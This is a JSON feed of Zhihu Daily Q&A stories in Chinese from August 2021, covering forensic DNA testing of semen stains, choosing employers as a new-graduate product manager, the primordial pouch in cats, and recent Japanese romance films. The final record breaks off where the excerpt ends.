[{"title":"犯罪现场勘查中发现了精斑，其中的DNA能保存多长时间?","date":"2021-08-11 23:07:19","description":"<div>\n<div>\n<div>\n<img src=\"https://pica.zhimg.com/v2-ff194198578194e1c47521e7fbea5ac4_l.jpg?source=8673f162\"><span>Moriarty K，</span><span>正常合作请私信，洗稿白嫖劝收手。</span>\n<a href=\"https://www.zhihu.com/question/433021197/answer/2052563761\" hidden>阅读原文</a>\n</div>\n<div>\n<p>上世纪九十年代，西南某省发生过一起<strong>入室强奸案</strong>，由于受害人比较特殊（是个有智力方面缺陷的残疾人），无法有效帮助警方指控嫌犯，加上当时的鉴定技术在国内十分稚嫩，所以调查起来较为艰难，虽然用了半年时间找到了疑犯，但因证据不足最后只能将其释放，万幸的是警方在现场调查方面做得比较仔细，保留了现场床边的一块毛巾。</p>\n<p>二十年后，这起案件的证物被取出送入鉴定室，通过上面的精斑确认了犯罪人，案件得破。</p>\n<p>距离案发时，已经过了整整二十一年。</p>\n<p>这种很久很久的陈旧物证，最后发挥作用的案例，在近十年屡见不鲜。</p>\n<p>--------</p>\n<p>现代侦查技术的厉害在哪里？</p>\n<p>说一千道一万，关键就在一个“<strong>微量</strong>”。</p>\n<p>现实中很多凶手清洗打扫现场比干了十多年保洁工作的阿姨还专业，弄完飘飘然觉得干净无比，张口就是“随便查”，结果一喷一检查一提取，什么都出来了。</p>\n<p>有的人仗着学过点开锁技术，用一根特制的铁钩把门锁钩开，入室盗窃，觉得做得天衣无缝，结果伸进去遗留在门里的半截铁钩上检测出他的表皮脱落细胞，最后人赃俱获。</p>\n<p>。。。。。。到最后真是：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-552612e3ed3f36677a414793c54f72b7_720w.jpg?source=8673f162\" alt=\"\"></figure><p>存放时间长了，证物中保留的 DNA 确实会发生降解，这是没错的</p>\n<p>好好打扫一下犯罪现场，看起来确实很干净，这也是没错的</p>\n<p>但很多时候就是那句话：</p>\n<p><strong>——“总不会一点都不剩了吧？”</strong></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/48142784\"><span>https://</span><span>zhuanlan.zhihu.com/p/48</span><span>142784</span><span></span></a></p>\n<p>只要“还剩一点”，那么我们就可以得到我们想要的结果。</p>\n<p>说回技术，以开头的案例为例，破案的主要办法是什么呢？</p>\n<p>首先，要知道“哪里有精斑”。</p>\n<p>在过去及现在，很多鉴定人员的第一程序依然是肉眼观察——这玩意是精液干燥后的产物，摸起来触感发硬，<strong>质地特殊</strong>，放在显微镜下面看，呈现出黄白色的鳞片状。</p>\n<p>除此之外，精斑在警用光源（戴橙色眼睛，用十三波段光源的 450nm 蓝色光）的照射下会发出自然荧光：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-a4f75f779ad89f9c3e8cd8b23ad60bec_720w.jpg?source=8673f162\" alt=\"\"></figure><p>接下来是<strong>预实验</strong>。</p>\n<p>目前对疑似精斑的检测技术逐渐丰富也越发简单化（如 PSA 等），但是其中最经典的还是<strong>酸性磷酸酶检出法——</strong>其原理在于<strong>精斑中含有大量前列腺分泌的的酸性磷酸酶</strong>，这种酶指标在血液、尿液、汗液、唾液等体液中的含量和精液相比甚少，利用这一点，进行实验：</p>\n<figure><img src=\"https://pica.zhimg.com/v2-1b4a60fba1c4f1d9527313295070e96e_720w.jpg?source=8673f162\" alt=\"\"><figcaption>将此两种试剂滴入样品中，若呈现黄色，则无精斑</figcaption></figure><figure><img src=\"https://pic1.zhimg.com/v2-d55b8297fcfa52bdb8f0fea2771d6526_720w.jpg?source=8673f162\" alt=\"\"><figcaption>若呈现紫色，说明有精斑，紫色是其中酸性磷酸酶催化水解后的混合显色结果</figcaption></figure><p>实际：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-a72021d79c751cc11f54d190dcfa23da_720w.jpg?source=8673f162\" alt=\"\"><figcaption>左边样品无精斑，右边样品有精斑</figcaption></figure><p>在确认样品确为精斑样品后，需要进行最关键的一步，<strong>DNA 的微量提取</strong>，常用的方法是进行一系列消化、纯化，这个步骤可以理解为“各种除杂”，意在得到一个比较干净的 DNA 模版，以便进行扩增，最终就能得到完整的分型图谱。</p>\n<p>--------</p>\n<p>综上，<strong>这实在是个很耐操的东西。</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-74b0c55f7182206a18836b484d15fcd9_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-87d2de0f65b8045a6474d9b949aabe8f_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-11e53e14143e2cbbe96eb5fd1a3998cf_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-2f4bdde81000e12e186fe28552295667_720w.jpg?source=8673f162\" alt=\"\"></figure><p>无论是自然条件下还是警方规范化的物证管理环境下，能保留鉴定价值的时间会比你想象当中长很多。</p>\n<p>至于具体的时间，目前只能说没有标准答案，因为<strong>不同环境下，温度、湿度、微生物等外界因素对 DNA 降解过程都有影响。</strong></p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/433021197\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9739081"},{"title":"对应届生而言，产品经理这个岗位最值得去的公司有哪些？","date":"2021-08-11 23:07:14","description":"<div>\n<div>\n<div>\n<img src=\"https://pica.zhimg.com/v2-09a67198ca358168a170ba4c5cbd1032_l.jpg?source=8673f162\"><span>刘飞，</span><span>互联网产品经理</span>\n<a href=\"https://www.zhihu.com/question/295153644/answer/2050828930\" hidden>阅读原文</a>\n</div>\n<div>\n<p>先说最明确的公司建议，还是越大的平台越好，一方面有专业能力训练的保障，另一方面有工作稳定性和收入稳定性的保障。这个是毋庸置疑的。哪怕长期想要创业或者做别的，先到大厂训练基本功也是必要的。</p>\n<p>按规模逻辑怎么排序呢？很简单，可以大略按照市值和公司员工规模来排。排出来大概就是这样：</p>\n<p>第一梯队</p>\n<p>腾讯，字节跳动，阿里</p>\n<p>第二梯队</p>\n<p>百度，美团，拼多多，快手，滴滴，京东，网易...</p>\n<p>第三梯队</p>\n<p>B 站，小红书，知乎，携程，有赞，苏宁，丁香园，陌陌...</p>\n<p>第四梯队</p>\n<p>网上没有公开信息的公司</p>\n<p>到这里并没有完，单凭这点去判断，还是很容易被坑。</p>\n<p>还要考虑以下几个要素。</p>\n<p>第一，公司的前景有没有问题。</p>\n<p>比如在 P2P 暴雷的时候进入一个互联网金融公司，或者双减政策出台的时候选择去在线教育公司。虽说很多行业内情应届生一般都不大好知道，但是大众媒体新闻里的信息，还是多少得知道一些的。</p>\n<p>踩了暗雷确实算点背。脸上写着是雷，还要去踩，就得怪自己了。</p>\n<p>第二，判断具体部门和岗位。</p>\n<p>有的同学觉得公司是好的，所有产品经理的岗位可能都是好的，这就是个大误区。</p>\n<p>比如，你去腾讯，既可能是去微信做产品经理（履历可以镀金镀钻石），也可能是去腾讯内部食堂的员工系统做产品经理（用户几百人的那种）。这中间的差别，就好比你是去平安银行做总经理助理，还是去平安银行门口的保安亭当助理。</p>\n<p>搞清楚你要去的岗位是什么样的，有时候比单纯看公司还要重要。普通公司的核心岗位，也比顶尖公司的差岗位要好。</p>\n<p>这里给出几个判断岗位优劣的标准：</p>\n<ul>\n<li>离核心业务近不近。比如去电商公司，是不是做电商相关。</li>\n<li>部门团队规模。比如整个大部门就一个产品经理，说明这个部门的业务不大需要产品。</li>\n<li>你的 leader 是什么角色。比如你的 leader 和 leader 的 leader 都是产品经理，而且是从业多年的专家，那就更靠谱一些。但你是 leader 是技术 / 市场，甚至是 HR/ 行政，那就要谨慎一些了。</li>\n</ul>\n<p>第三，了解下公司的价值观。</p>\n<p>价值观是个比较玄学的问题，通常是属于那种「约束条件」，不大会是决策因素。</p>\n<p>大多数情况下，价值观不大影响你的工作决策。</p>\n<p>但如果你上班第一天的培训，就在破冰游戏里让你说「三围」和「三初」，搞得你瞠目结舌，愤而离职，那结果会很麻烦，你得重新找工作。</p>\n<p>所以了解公司的价值观、外部对这个公司或者部门的评价，有助于排雷，排除掉那些你肯定忍不了的岗位。</p>\n<p>综合这几个因素，再看公司本身的规模水平，基本能得出结论了。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/295153644\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9739092"},{"title":"猫咪的小肚腩是有哪些作用？","date":"2021-08-11 23:07:08","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-38bfedba3ee7ba2c0317bbdf06a16105_l.jpg?source=8673f162\"><span>猫研所，</span><span>猫咪知识精准科普平台</span>\n<a href=\"https://www.zhihu.com/question/474354836/answer/2040544122\" hidden>阅读原文</a>\n</div>\n<div>\n<p>猫咪肚子上垂下来“一坨肉”？</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-9a044f65f5b251b9cebcdf28140468ec_720w.gif?source=8673f162\" alt=\"\"><figcaption>图自：油管</figcaption></figure><p>相信不少铲屎官一开始会以为是猫咪肥胖的肚腩...</p>\n<p>也有少部分会以为猫咪生了什么病，是不是肿瘤？</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-bb220258a3129d126797c0e87a7c5cbb_720w.jpg?source=8673f162\" alt=\"\"><figcaption>图自：tumblr</figcaption></figure><p>博学的铲屎官又会淡定地说，这是正常的原始袋...</p>\n<figure><img src=\"https://pica.zhimg.com/v2-b11b5baa738acb3451543c35def0aeaf_720w.jpg?source=8673f162\" alt=\"\"><figcaption>图自：catworld</figcaption></figure><p><strong>可是，该如何区分是原始袋还是肥胖呢？为什么有的猫咪有，有的猫咪又没有呢？</strong></p>\n<p><strong><strong>一，什么是原始袋？</strong></strong></p>\n<p>原始袋最常用的英文是 primordial pouch，也有很多别称，例如：Belly flap，Spay sway，Apron，Fat pouch，Belly bag...</p>\n<p>它是长在猫咪下腹部，连伸到后腿内侧的一块松散的皮肤组织（腹部皮瓣，abdominal flap）。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-e8660e9dd5bff9fd594c6aaa466a9d88_720w.gif?source=8673f162\" alt=\"\"><figcaption>图自：油管</figcaption></figure><p>在猫咪走路或奔跑时观察到的左右“晃动的肚腩”，仔细触摸就会发现，主要是皮肤，而脂肪较少。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-423404e016a1e4c700a47224a593ea09_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-bfdf1c3a2238864c5cfcfc43748a2d1f_720w.gif?source=8673f162\" alt=\"\"><figcaption>原始袋在很多猫科动物中都可以发现</figcaption></figure><p><strong><strong>二，原始袋有什么功能？</strong></strong></p>\n<p>这样的身体结构，到底有什么用呢？目前较多认可的猜测，有三种：</p>\n<p><strong>（1）奔跑时伸展，跑得更快</strong></p>\n<p>原始袋的松弛皮肤，增加了猫咪肢体的伸展能力，这可以让猫咪迈开更大的步伐，以提高移动速度。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-3d7dbdcd71cd05c16045e16cef98e58e_720w.jpg?source=8673f162\" alt=\"\"></figure><p>无论是在捕猎时，还是在躲避天敌时，猫咪都属于“爆发性”选手，无法长时间的追逐奔跑。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-83fc7ac5768c6cc66b01902747c3d459_720w.gif?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-74e2555010f96dc133393de10ca93455_720w.gif?source=8673f162\" alt=\"\"><figcaption>图自：giphy</figcaption></figure><p>所以短时间的高速移动，有助于猫咪保持能量，增加存活机率。</p>\n<p><strong>（2）储存热量，更耐饿</strong></p>\n<p>虽然在是储存脂肪还是储存多余食物上，没有统一结论，但研究人员一致认为：猫咪原始袋的一个重要作用，是像骆驼的驼峰一样，帮助 TA 们储存热量，以备不时之需。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-2e04171a0dc3e2272a18f8928947d58f_720w.jpg?source=8673f162\" alt=\"\"></figure><p>毕竟野外的猫咪，除了捕食兔类鼠类，更是不折不扣的被捕食者，因此没法像家猫一样，每日能保证有固定的三餐。</p>\n<p><strong>（3）打架时保护器官，更耐打</strong></p>\n<p>猫咪在打架时比较常用的招数是一招“兔子踢”。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-50898f3f9db72c30ee56e70f501eefa8_720w.gif?source=8673f162\" alt=\"\"></figure><p>在使用此招时，有时不可避免地会露出肚皮；</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-1d39ecd6ae800b0690e21779c67df06c_720w.jpg?source=8673f162\" alt=\"\"></figure><p>同时，被害猫咪最常受伤的部位，也包括腹部。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-e5b35bdbf2437fda46e6f0a6e50606c9_720w.gif?source=8673f162\" alt=\"\"><figcaption>很多捕食者的攻击目标，也都选在腹部</figcaption></figure><p>研究人员推测，原始袋松弛有弹性的皮肤，可以帮助猫咪在攻击和被攻击时，都尽可能地避免腹部受伤，保护腹部的器官。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-273276d8335cdadbae2366fb672fda49_720w.jpg?source=8673f162\" alt=\"\"><figcaption>图自：cat-world</figcaption></figure><p><strong><strong>三，原始袋和肥胖有关吗？</strong></strong></p>\n<p>但并不是肥胖的猫咪一定就有原始袋，瘦的猫咪存在原始袋的案例也屡见不鲜。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-846a905cf77d6fbb9add2512fd5257b9_720w.jpg?source=8673f162\" alt=\"\"></figure><p>只是有原始袋的猫咪，如果发胖，或者发胖后又减肥，原始袋可能更加明显（毕竟还是有脂肪的）。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-9a0bccb34ffb69291bf590f1cd7cc0c8_720w.jpg?source=8673f162\" alt=\"\"><figcaption>图自：pinterest</figcaption></figure><p>这也是有的猫咪，到了老年以后，原始袋会更明显的原因（有点像铲屎官的妊娠纹，胖的时候会把皮肤撑的更开）。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-b9bf6652d4c456b7c75154557d9e144a_720w.gif?source=8673f162\" alt=\"\"><figcaption>一些猫咪的原始袋会在老年后更加明显，而年轻时不易觉察</figcaption></figure><p><strong><strong>四，所有猫都有原始袋吗？</strong></strong></p>\n<p>相对来说，公猫存在原始袋的现象比母猫更常见；但最主要的影响因素是猫咪的品种，一些品种的猫咪更易有原始袋。</p>\n<p>也有猫咪品种协会将“原始袋”列入某些品种猫咪的“审美考核标准”中。</p>\n<p>例如孟加拉猫，埃及猫，日本短尾猫等。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-3cad8bc6c42d28af53be74da9564ce90_720w.jpg?source=8673f162\" alt=\"\"><figcaption>孟加拉猫 图自：cccofa</figcaption></figure><figure><img src=\"https://pica.zhimg.com/v2-79fea882fd222cda8b3eeefb582cdce7_720w.jpg?source=8673f162\" alt=\"\"><figcaption>埃及猫 图自：CFA</figcaption></figure><p><strong><strong>五，肚子下垂，还可能是因为什么？</strong></strong></p>\n<p>不过，无论是原始袋还是肥胖，猫咪都是慢慢变化的。如果发现猫咪肚子突然下垂，就要进行一系列的排查。</p>\n<ul><li><strong>圆鼓鼓的下垂</strong></li></ul>\n<p>需要排查腹水、胃肠道阻塞、子宫蓄脓、寄生虫、癌症等，可以参考这篇：</p>\n<p><a href=\"http://link.zhihu.com/?target=http%3A//mp.weixin.qq.com/s%3F__biz%3DMzUyNDg2NzY1Mw%3D%3D%26mid%3D2247502485%26idx%3D1%26sn%3Def79fe6e460ad50675f672e7fd725318%26chksm%3Dfa244bbfcd53c2a9bd39df93af684cd55b6cd2ff9a7cf9d88c0b9a4051b28e4c8e82fc5a6dc0%26scene%3D21%23wechat_redirect\" target=\"_blank\" rel=\"nofollow noreferrer\">猫咪肚子圆鼓鼓，怎么区分是胖还是生病？</a></p>\n<ul><li><strong>软趴趴的下垂</strong></li></ul>\n<p>主要需要排查肿瘤和疝。</p>\n<p><strong>▌</strong> 肿瘤通常是一个肿块，质地较硬，按压没有明显回缩，大小较固定。当发现疑似异常，建议就医体检排查。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-d42712df0ad02e83e73062a8b9033786_720w.jpg?source=8673f162\" alt=\"\"><figcaption>确实有这么下垂的健康猫咪，但有的也要排查健康问题 图自：deviantart</figcaption></figure><p><strong>▌</strong> 疝气通常会有比较明显的鼓包，质地柔软，按压可能回缩，随不同姿势表现出不同大小。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-7babc99bcc3399e5717c0284a605fe0b_720w.jpg?source=8673f162\" alt=\"\"><figcaption>腹部疝 图自：WordPress</figcaption></figure><p>可以记住两点：</p>\n<p>✔ 肥胖，胖的是全身，不会只有小肚子胖；</p>\n<p>✔ 健康异常，通常还会表现出不爱运动精神食欲差等其他异常。</p>\n<p>总之，多陪玩多观察，不仅能预防肥胖，还能及早发现猫咪的一些异常情况~</p>\n<figure><img src=\"https://pica.zhimg.com/v2-1f0660c62c426302632306dfb45b2b7a_720w.gif?source=8673f162\" alt=\"\"><figcaption>车车：这不是肉！</figcaption></figure>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/474354836\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9739082"},{"title":"有什么好看的日本纯爱电影?","date":"2021-08-11 23:07:02","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-71d09584d2b2894a449060f5f670a9fa_l.jpg?source=8673f162\"><span>陀螺电影</span>\n<a href=\"https://www.zhihu.com/question/327037037/answer/2053425783\" hidden>阅读原文</a>\n</div>\n<div>\n<figure><img src=\"https://pic1.zhimg.com/v2-ddef2bdfc0980184066334295f9b9de9_720w.jpg?source=8673f162\" alt=\"\"></figure><p>继前阵子在豆瓣小火了一阵的《大豆田永久子与三名前夫 》之后，备受瞩目的编剧坂元裕二再次贡出了一部“屠榜豆瓣热搜”的作品——《花束般的恋爱》，<strong>短短半个月时间就有超过 10 万人标记。而推荐此片的最热一条微博点赞转发量超过了 200 万。</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-605646c59a2ee0ac16a1fc7381f25a80_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《花束般的恋爱》剧照</figcaption></figure><p>究竟是什么样的爱情，让这部日本电影在中国获得如此广泛的共鸣？</p>\n<p>借此机会，我们也想讨论一下，最近几年的日本新片「爱情片」这个分支里，有哪些值得讨论的爱情观念。又是为什么，日本近年的这些爱情片，可以兼顾艺术性，又贴近现实，又能引人共鸣呢？</p>\n<p>也欢迎大家在评论区留言和我们讨论你们看过的日本爱情新片～</p>\n<ol><li><strong>爱是附于物的记忆体</strong></li></ol>\n<p>《花束般的恋爱》里的男女主麦和绢，是一对典型的“世另我”式情侣，对于豆瓣文青来说，尤其理想。</p>\n<p>大学时期，两人因为错过末班电车而相识。好巧不巧，他们的兴趣爱好几乎同步，就像两个拥有无数共同话题的豆瓣友邻——<strong>无法理解为什么其他人认不出押井守，喜欢相同的诗人与小说家，都会拿电影票当书签，无比热衷于讨论最新的漫画情节，穿同一个款式的小白鞋，甚至还错过了同一场次的展览会……</strong></p>\n<p>初次相遇，就如同村上春树在《遇见百分百女孩》里触电般的描述，两个人都是彼此的“百分百恋人”。是上苍眷顾的偶然命运，让他们走到一起。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-d0629b086d0fa0d5f9a7022bf6c7ce96_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《花束般的恋爱》剧照</figcaption></figure><p>然而即使是这样万分之一概率的恋情，却仍旧是无法永久保持“花期”的。爱如花束般，含苞待放、盛开、渐渐枯萎，最后在尚未腐烂时丢弃。</p>\n<p>起初的如胶似漆，随着两人步入下一段的人生轨迹，逐步被找工作的忧虑困扰、无比现实的生活处境所吞没。两人最初在一起时，绢一直关注的纯爱博主自杀的消息，预言了这段恋情的收场：“爱情就像一场派对，总有一天要结束。”</p>\n<p>为什么爱会结束？<strong>大多数的国内爱情片兜兜转转，大抵是绕不开一个答案：“没有物质的爱情就像一盘沙。“</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-46716b7d1d563e19b9817973dc4ad264_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《我要我们在一起》就是典型被物质耽误的爱情故事</figcaption></figure><p>而坂元裕二给出的答案则是在此基础上的再次反观：<strong>慢慢内耗、温水煮青蛙式的“降低标准”。</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-cdce67b3741f65a9d840f64029e517b2_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《花束般的恋爱》剧照</figcaption></figure><p>文青间的爱，不是因为物质的困乏而泯灭，<strong>而是因为无法接受追求物质的自己，在社会化的过程中改变太多，</strong>这份改变导致了爱情的变味。</p>\n<p>坂元裕二是恋物的，在片中，他将诸多现实物件与文艺爱好的细节，作为承载两人欲望与情感的记忆体（或者说是纪念品），附着住恋爱初期那些日常之中“奇异片刻”的心动感觉。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-7906adb84134b34952ccce036c56c63b_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《花束般的恋爱》剧照</figcaption></figure><p>但这些感觉又随着时间的流逝，无法逆流而上，只能顺其消亡。它们逐渐被倾覆、被遗忘，即使“百分百爱情”也终究形同陌路。</p>\n<p>绢无法跨越过去的，正是这条名为“时间”的河流。如果用数字量化她的心理，即是她无法接受 100%逐步跌落向 60%之间那 40%的落差。宁愿分手，哪怕再找到的下一个恋人起初就只有 60%出头，也好过带着这份落差度日。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-4653e3d1bf16fe5d438b1707f881dfac_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《花束般的恋爱》剧照</figcaption></figure><p><strong>2.爱是冲不破的自我欲念</strong></p>\n<p>2019 年上映、入选当年日本旬报十佳第八位的<strong>《爱情是什么》</strong>，电影从标题就开始讨论这个问题。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-6c7337b27549597b60b963e02ca7e3b1_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《爱情是什么》剧照</figcaption></figure><p>在看的时候，我会不自觉将它与成濑巳喜男的《浮云》作对比。拿日本电影大师与新世代的青年导演相提并论，似乎有些“骇人听闻”，但抛开其他层面，就电影中两性关系部分的剧情来说，《爱情是什么》确是一部代日本年轻人版的《浮云》。</p>\n<p>28 岁的 OL 光子为了五个月前遇到、一见钟情的男子守，把工作和朋友全部抛诸脑后。即使失业，即使被好友冷眼看待，只要能在守身边，她就感到幸福。</p>\n<p>可是对守来说，光子只不过是随便交往一下的女生而已。他无法接受长期、稳定地与光子谈恋爱，反复出轨、勒令光子离开，甚至把光子介绍给男性朋友。</p>\n<p>然而，对于这份无法改变、双方不对等的单恋，光子最终做出了令人意外的决断。<strong>她要假装与现任男友谈恋爱，从而得到和守见面的机会，在每次短暂的见面时分维系住自己的这份单恋。</strong></p>\n<p>在这段充满藕断丝连、欲罢不能、痛苦决绝，甚至最终有些极端化的恋情里，光子与守展现出了他们无法被轻易判定的两性关系。</p>\n<p>在柏拉图的精神恋爱说中，爱情是一种纯粹的精神性活动，是人的灵魂对于“美”的本体眷恋的表现。但我们无法在这份爱情里看到“美”的存在，它更像是一圈冲不破的自我欲念围起的藩篱。人被降格为藩篱里的动物，其面貌甚至是丑陋的——<strong>男人反复抛弃着爱他的女人，而女人始终做好抛弃一切的准备，以丢失自我的方式为了爱活下去。</strong></p>\n<p>很难说清楚，光子是无比热烈地爱着守，还是在这个过程中被围困于自我欲念中，<strong>爱上的其实是那个不顾一切爱上守的自己。</strong></p>\n<p>但无论是哪种爱，它给人的感受即使不是美的，也是有其震撼性的。</p>\n<p>就像《浮云》中对“爱情如浮云”的描述：<strong>几次分分合合，两人的爱始终无法对等。</strong>但即使女主幸子知道男主兼吾是禀性难移、无法担责的“百分百纯度渣男”，自己随时都有被抛弃的风险，最后很快就会凄惨地死去，她还是要去爱他，因为控制不住自己的这份欲念。</p>\n<p>这是一份过分沉溺的，也是超脱于世俗的执着。她不在意自己是不是成为了男性的牺牲品，也不在意这份爱是不是“看得到、摸不着”的浮云，她只是要去爱。</p>\n<p><strong>3.爱是穷途末路之境</strong></p>\n<p>今年年初，几乎一辈子都在拍爱情片的行定勋，拿出了他的“得意之作”<strong>《穷途鼠的奶酪梦》</strong>。电影讲述了两个男人之间奇异而又有点“刁钻”的深刻恋情——它需要观众不断代入角色、如悬疑片般推理，方能得出结论。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-2b4c527e35e578ad1945be77ce6fb8be_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《穷途鼠的奶酪梦》剧照</figcaption></figure><p>恭一是个“爱无能”者，他从学生时代起，就只能与“喜爱自己的女性”交往，不断重复着被动的恋爱，也因为优柔寡断的性格从来不懂得拒绝。因此，他只能频繁地出轨。</p>\n<p>恭一的后辈今之濑，则是见到恭一的第一眼起，就无可救药地爱上了他。时隔 7 年再次相遇，今之濑为他隐瞒出轨的事实，作为代价，他要求恭一拿身体交换。</p>\n<p>今之濑死缠烂打地利用策略，靠近和追求恭一，两人的爱情也遍布着自私、贪婪、痛苦与病态，不断分分合合。经历这一切的恭一，终于在“穷途末路”时体会到了揪心的痛苦，学会正视自己的情感。但今之濑最终却对这份“确定的爱”感到畏惧，选择了逃离。</p>\n<p>精神分析领域，有个词叫“清醒梦”，指的是一个人能够在梦境中意识到自己此刻在做梦，类似于《盗梦空间》中的“在梦中梦里知道自己身处梦中梦”。今之濑与恭一的这段关系也是如此，很复杂、很扭曲，却也很清醒。</p>\n<p><strong>今之濑过分地执着而卑微，给了恭一以爱的引子：作为一个“爱无能”者，他最无法抗拒的就是这种丢弃自我、眼里只想活成对方样子的今之濑，他没办法说拒绝。</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-7478bb5703bb59837c95ba7671c0b07a_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《穷途鼠的奶酪梦》剧照</figcaption></figure><p>第一次分手，今之濑说他希望恭一找个能照顾他的普通女人结婚就行；而恭一说他希望今之濑找个用情至深的人。</p>\n<p>两个人都很有自知之明，也都知道对方的心意，各退一步，才促成这个局面——看似分手，实际是互诉衷肠。</p>\n<p>再言分手，为了偷窥恭一而住在车里的今之濑，告诉恭一自己只需要几个月或半年见面一次就行，乞求对方给一点养分得以让自己活下去。恭一的回答是“不需要、已经不需要你了。”</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-4408f44a792f6ee278d2b3a3cd97a62c_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《穷途鼠的奶酪梦》剧照</figcaption></figure><p>在片中的设定里，恭一越是拒绝得更干脆，两人的撕裂越大，越是显现出双方情感的漂移、逆转与挣扎。今之濑需要无限克制自己的爱，去尝试一次次逃离；而恭一需要无限克制自己的爱无能，去尝试一次次拒绝。</p>\n<p>两人都是处在“穷途末路之境”这样极限状态的“老鼠”，清醒地知道自己在做一个“奶酪梦”。只有告诉自己是在做梦，这份爱才得以维系。</p>\n<p>当他们最后不再处于这种状态时，当这份爱被合理化时，反而是清醒梦的梦醒时刻。一切难舍难离、深入骨髓的关系，都将在瞬间崩盘。</p>\n<p><strong>4.爱是双重性的幻影</strong></p>\n<p>滨口龙介的《夜以继日》，也许是近年日本爱情电影中最为出众、超脱出既有关系模式讨论的存在。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-23f0440ab4d27bf10115270d14ca9859_720w.jpg?source=8673f162\" alt=\"\"><figcaption>《夜以继日》海报</figcaption></figure><p>2018 年，它在戛纳电影节首映之后，获得的毁誉参半的“狗血”评论，<strong>恰恰证明了它是我们这个时代爱情电影中无与伦比的神作。抛开滨口极其高超的电影技法，仅是关注于他对主角朝子、麦 / 亮平的情感关系塑造，也能得出这一结论。</strong></p>\n<p>自从初恋麦失踪以后，朝子失去了生活的目标。两年后，她遇到了一个外形与恋人几乎一模一样的男人亮平。她被这种奇妙的相似性所吸引，却逐渐感受到亮平拥有麦截然不同的性格。</p>\n<p>又在多年之后，麦突然以明星的身份出现在朝子的生活中。朝子毫不犹豫地抛下一切与麦私奔，却在私奔到一半时，突然来了个回马枪。她抛弃了麦，即使承受着巨大的不解，也要重新回到亮平的身边。</p>\n<p>正如同日文片名“寝ても覚めても”（无论是在睡梦中还是醒来了）以及英文片名“Asako I &amp; II”（朝子 1 与朝子 2），本片的主题是关于爱的双重性概念的讨论。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-ede61da7f657bb1eb194149eb9e77a4f_720w.jpg?source=8673f162\" 